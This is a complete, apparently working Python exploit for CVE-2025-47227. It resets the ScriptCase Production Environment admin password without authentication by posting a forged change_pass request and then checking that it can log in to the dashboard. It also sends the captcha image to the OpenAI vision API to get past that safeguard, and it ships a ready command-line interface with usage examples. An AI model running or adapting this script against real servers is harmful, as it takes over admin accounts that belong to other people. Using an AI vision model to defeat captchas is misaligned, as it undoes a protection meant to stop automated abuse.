#!/usr/bin/env python3
"""
CVE-2025-47227 - ScriptCase Password Reset (Pre-Auth)
Exploit: Resets the ScriptCase Production Environment admin password without authentication.

Uso:
  python3 cve_2025_47227.py --target https://tar.get --password 'P@ssw0rd!' --captcha ABCD

"""

import argparse
import sys
import os
import tempfile
import re
from urllib.parse import urljoin

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] Instale requests: pip3 install requests urllib3")
    sys.exit(1)


class CVE202547227:
    """ScriptCase Production Environment Pre-Auth Password Reset"""

    def __init__(self, target, password, captcha=None, timeout=15, proxy=None):
        self.target = target.rstrip("/")
        self.password = password
        self.captcha = captcha  # manual override
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

        # Paths
        self.login_path = "/_lib/prod/lib/php/devel/iface/login.php"
        self.captcha_path = "/_lib/prod/lib/php/devel/lib/php/secureimage.php"
        self.login_url = urljoin(self.target, self.login_path)
        self.captcha_url = urljoin(self.target, self.captcha_path)

    def detect(self):
        """Check if target runs ScriptCase with vulnerable login.php"""
        print(f"[*] Target: {self.target}")
        print(f"[*] Checking {self.login_path} ...")

        try:
            r = self.session.get(self.login_url, timeout=self.timeout)
        except requests.RequestException as e:
            print(f"[-] Connection failed: {e}")
            return False

        if r.status_code != 200:
            print(f"[-] login.php returned HTTP {r.status_code} target may not be ScriptCase")
            return False

        # Look for ScriptCase indicators
        indicators = [
            "nm_action", "ScriptCase", "field_pass", "Production Environment",
            "change_pass", "secureimage.php"
        ]
        found = [i for i in indicators if i in r.text]
        if not found:
            # Still might be ScriptCase — check status code only
            if len(r.text) < 100:
                print(f"[-] Response too small ({len(r.text)}b) — not ScriptCase")
                return False
            print(f"[!] ScriptCase indicators not found but proceeding (200 OK, {len(r.text)}b)")

        print(f"[+] ScriptCase login detected! ({', '.join(found) if found else 'HTTP 200'})")
        return True

    def get_captcha(self):
        """Download and return captcha image path"""

        # We need a valid session cookie from login.php first
        if "PHPSESSID" not in self.session.cookies:
            self.session.get(self.login_url, timeout=self.timeout)

        r = self.session.get(self.captcha_url, timeout=self.timeout)
        if r.status_code != 200 or len(r.content) < 100:
            print(f"[-] Failed to download captcha: HTTP {r.status_code}, {len(r.content)} bytes")
            return None

        # Save to temp file
        fd, path = tempfile.mkstemp(suffix=".png", prefix="captcha_")
        os.close(fd)
        with open(path, "wb") as f:
            f.write(r.content)

        print(f"[+] Captcha saved: {path}")
        return path

    def solve_captcha(self, image_path):
        """Solve captcha. Tries auto-solve, falls back to manual input."""

        # Try OpenAI vision if available
        try:
            import base64
            with open(image_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()

            if os.getenv("OPENAI_API_KEY"):
                print("[*] Attempting OpenAI vision...")
                r = requests.post(
                    "https://api.openai.com/v1/chat/completions",
                    headers={
                        "Authorization": f"Bearer {os.getenv('OPENAI_API_KEY')}",
                        "Content-Type": "application/json"
                    },
                    json={
                        "model": "gpt-4o",
                        "messages": [{
                            "role": "user",
                            "content": [
                                {"type": "text", "text": "Read the 4 uppercase letters in this captcha image. Reply ONLY with the 4 letters, nothing else. No spaces."},
                                {"type": "image_url", "image_url": {"url": f"data:image/png;base64,{b64}"}}
                            ]
                        }],
                        "max_tokens": 10,
                        "temperature": 0
                    },
                    timeout=15
                )
                if r.status_code == 200:
                    result = r.json()["choices"][0]["message"]["content"].strip().upper()
                    result = re.sub(r'[^A-Z]', '', result)
                    if len(result) == 4:
                        print(f"[+] Solved: {result}")
                        return result
        except Exception as e:
            print(f"[!] Auto-solve failed: {e}")

        # Manual fallback — interactive input
        print(f"\n[!] Captcha saved to: {image_path}")
        print(f"[!] Open the image and type the 4 uppercase letters below.")
        print(f"[!] Or Ctrl+C and re-run with: --captcha <4_LETTERS>")
        try:
            text = input("\nCaptcha (4 letters): ").strip().upper()
            text = re.sub(r'[^A-Z]', '', text)
            if len(text) == 4:
                return text
            print(f"[-] Invalid captcha: '{text}' (need exactly 4 letters)")
            return None
        except (EOFError, KeyboardInterrupt):
            print("\n[-] Aborted.")
            return None

    def reset_password(self, captcha_text):
        """Send password reset request"""
        email = f"poc_{captcha_text.lower()}@pentest.local"
        data = {
            "ajax": "nm",
            "nm_action": "change_pass",
            "email": email,
            "pass_new": self.password,
            "pass_conf": self.password,
            "lang": "en-us",
            "captcha": captcha_text,
        }

        print(f"[*] Resetting password to: {self.password}")
        print(f"[*] Email: {email}")

        r = self.session.post(self.login_url, data=data, timeout=self.timeout)

        if '"result":"success"' in r.text:
            print(f"[+] PASSWORD RESET SUCCESS!")
            return True
        elif '"result":"error"' in r.text:
            print(f"[-] Reset failed: {r.text.strip()[:200]}")
            return False
        else:
            print(f"[-] Unexpected response ({len(r.text)}b): {r.text.strip()[:200]}")
            return False

    def verify_login(self):
        """Verify we can login with the new password"""
        login_url = urljoin(self.target, "/_lib/prod/lib/php/nm_ini_manager2.php")
        data = {
            "option": "login",
            "opt_par": "",
            "hid_login": "S",
            "field_pass": self.password,
            "field_language": "en-us",
        }

        r = self.session.post(login_url, data=data, timeout=self.timeout)

        if r.status_code != 200 or len(r.text) < 1000:
            print(f"[-] Login verification returned {r.status_code} ({len(r.text)}b)")
            return False

        # Dashboard indicators
        indicators = ["nm_set_option", "nm_iframe", "devel/iface", "Production Environment"]
        found = [i for i in indicators if i in r.text]

        if found:
            print(f"[+] Login successful! Admin dashboard accessible ({len(r.text)}b)")
            print(f"[+] Login URL: {login_url}")
            return True
        else:
            print(f"[!] Login returned {len(r.text)}b but no dashboard indicators found")
            return False

    def exploit(self):
        """Main exploit flow"""
        print("=" * 55)
        print(" CVE-2025-47227 — ScriptCase Password Reset")
        print("=" * 55)
        print()

        # Step 1: Detect
        if not self.detect():
            return False

        # Step 2: Get captcha (skip download if --captcha provided)
        if self.captcha:
            print(f"[*] Using provided captcha: {self.captcha}")
            captcha_text = self.captcha
        else:
            captcha_path = self.get_captcha()
            if not captcha_path:
                return False
            captcha_text = self.solve_captcha(captcha_path)
            try:
                os.unlink(captcha_path)
            except OSError:
                pass
            if not captcha_text:
                return False

        # Step 4: Reset password
        if not self.reset_password(captcha_text):
            return False

        # Step 5: Verify login
        print()
        if self.verify_login():
            print()
            print("=" * 55)
            print(f" EXPLOIT COMPLETO")
            print(f" URL:    {urljoin(self.target, '/_lib/prod/lib/php/nm_ini_manager2.php')}")
            print(f" SENHA:  {self.password}")
            print("=" * 55)
            return True
        else:
            print()
            print("[!] Password reset succeeded but login failed.")
            print("[!] Try manually:")
            print(f"    URL: {urljoin(self.target, '/_lib/prod/lib/php/nm_ini_manager2.php')}")
            print(f"    Password: {self.password}")
            return False


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-47227 — ScriptCase Pre-Auth Password Reset",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cve_2025_47227.py --target https://tar.get --password 'P@ssw0rd!'
  python3 cve_2025_47227.py --target https://tar.get --password 'Senha@123' --captcha ABCD
  python3 cve_2025_47227.py --target https://tar.get:8080 --password 'Admin123!' --timeout 30
        """
    )
    parser.add_argument("--target", "-t", required=True,
                        help="Target URL (e.g. https://tar.get)")
    parser.add_argument("--password", "-p", required=True,
                        help="New admin password to set")
    parser.add_argument("--captcha", "-c", default=None,
                        help="Captcha text (4 uppercase letters). If omitted, tries auto-solve.")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("--proxy", default=None,
                        help="Proxy URL (e.g. http://127.0.0.1:8080)")

    args = parser.parse_args()

    if not args.target.startswith("http"):
        print("[!] Target must start with http:// or https://")
        sys.exit(1)

    exploit = CVE202547227(
        target=args.target,
        password=args.password,
        captcha=args.captcha,
        timeout=args.timeout,
        proxy=args.proxy,
    )

    success = exploit.exploit()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
